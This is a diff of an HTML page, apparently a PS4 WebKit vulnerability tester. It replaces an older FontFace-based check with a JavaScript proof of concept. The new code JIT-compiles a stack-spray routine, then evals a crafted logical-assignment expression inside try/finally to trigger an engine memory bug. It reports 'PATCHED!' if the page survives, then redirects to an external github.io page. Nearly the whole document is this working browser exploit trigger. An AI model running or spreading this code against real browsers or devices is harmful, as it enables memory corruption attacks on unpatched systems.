@@ -1,69 +1,74 @@
+<script>
+
+alert("If you receive no alert after clicking 'OK' it means that it worked,\n and if you receive the message: 'PATCHED!' it means that it does not work on your firmware");
+
+OFFSET_SIZE = 7;
+// Default offset_size is: OFFSET_SIZE = 400;
+// Running in debug mode with OFFSET_SIZE=7 produces the following bytecode for the vulnerable code:
+// Fill the stack with the return value of the provided function.
+function stackspray(f, x, d) {
+  if(d==0) return;
+  // This function will spill all the local variables to the stack
+  // since they are needed for the returned array.
+  let v0 = f*x;
+  let v1 = f*x*x;
+  let v2 = f*x*x*x;
+  let v3 = f*x*x*x*x;
+  let v4 = f*x*x*x*x*x;
+  let v5 = f*x*x*x*x*x*x;
+  let v6 = f*x*x*x*x*x*x*x;
+  let v7 = f*x*x*x*x*x*x*x*x;
+  let v8 = f*x*x*x*x*x*x*x*x*x;
+  let v9 = f*x*x*x*x*x*x*x*x*x*x;
+  let v10 = f*x*x*x*x*x*x*x*x*x*x*x;
+  let v11 = f*x*x*x*x*x*x*x*x*x*x*x*x;
+  stackspray(f,x, d-1);
+  return [v0, v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11];
+}
+    
+function preparestackspray() {
+   // JIT compile the stack spray.
+   for (let i = 0; i < 10000; i++) {
+     // call twice in different ways to prevent inlining.
+     stackspray(1337,1, 10);
+     stackspray(2,1, 1);
+   }
+}
+preparestackspray();
+
+function main() {
+offset_str = '';
+for(let i = 0; i<OFFSET_SIZE; i++) {
+  offset_str += "let offset_" + i + "=1;"
+}
+
+code = `
+stackspray(0x13371338,1, 200);
+for(var i=0; i<(10000 + 1); i++) {
+  ${offset_str}
+  const var08 = 1;
+  if(i==0) {
+    try {
+      undefined[0] ||= var08 *= some;
+    }
+    catch { }
+    finally { }
+  }
+}
+`;
+
+eval(code);
+}
+main();
+
+
+alert("PATCHED!");
+ document.location.href="https://zellix67.github.io/";
+
+</script>
 <html>
-    <title>Webkit 8.xx test</title>
-
-    <script>
-        function testwebkit() {
-            alert("THIS SITE IS A TEST FOR THE WEBKIT VULNERABILITY FOR THE PS4\nCLICK OK\nIF YOU DON'T SEE ANY 'API PATCHED' ERROR OR 'MEMORY ERROR' ALERT OR ANY ERROR ALERT THAT'S MEAN IT'S NOT PATCH");
-
-            CheckAPI();
-        }
-
-        function CheckAPI() {
-            try {
-                API();
-            }catch(e){
-                var ge = e.message;
-                if (ge == "The string did not match the expected pattern."){
-                    document.getElementById("API").innerHTML = "API not patch !\n";
-                } else if (ge == "Illegal constructor.") {
-                    document.getElementById("API").innerHTML = "API not implement !\n";
-                } else {
-                    document.getElementById("API").innerHTML = e.message;
-                }
-            }
-
-        }
-
-        function API() {
-            let font = new FontFace("font1", 'url()', {});
-
-            var fontFaceSet = new FontFaceSet([font]);
-
-            font.family = "font2";
-
-            document.getElementById("API").innerHTML = "API patched !\n";
-
-            CheckWE();
-
-        }
-
-        function CheckWE() {
-            let font = new FontFace("font1", '', {}, ConfirmWork());
-
-            var fontFaceSet = new FontFaceSet([font]);
-
-            font.family = "font2";
-
-            NotWork();
-
-        }
-
-        function ConfirmWork() {
-            //alert("Webkit Work !");
-            document.getElementById("WE").innerHTML = "Webkit vulnerability work !\n";
-            //go();
-        }
-
-        function NotWork() {
-            //alert("Webkit Patched here !");
-            document.getElementById("WE").innerHTML = "Webkit vulnerability not work !\n";
-        }
-    </script>
-
-    <body>
-        <button onclick="testwebkit()">Check vulnerability</button>
-        <p id="API"></p>
-        <p id="WE"></p>
-    </body>
-
+  <body>
+    <h1>Sucess webkit!</h1>
+   <button onclick="location.href = '../..'">Back to home</button><br>
+  </body>
 </html>
